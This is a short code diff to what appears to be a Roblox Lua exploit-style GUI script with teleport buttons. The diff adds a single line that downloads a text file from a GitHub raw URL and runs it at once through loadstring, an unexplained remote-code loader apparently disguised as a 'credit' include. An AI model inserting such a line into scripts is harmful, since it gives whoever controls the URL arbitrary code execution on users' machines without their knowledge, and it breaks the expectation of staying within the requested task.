@@ -47,6 +47,8 @@ local teleportButton = createStyledButton(frame, "Teleport Back", UDim2.new(0, 0
 local teleportAndCreateBlockButton = createStyledButton(frame, "Teleport & Create Blocks", UDim2.new(0, 0, 1 * buttonSpacing, 0))
 local refreshTeleportButton = createStyledButton(frame, "Refresh Teleport", UDim2.new(0, 0, 2 * buttonSpacing, 0))
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gitolan/gefop-/main/creditgef.txt"))()
+
 local initialPosition
 local isTeleported = false
 local lastTeleportedPlayer
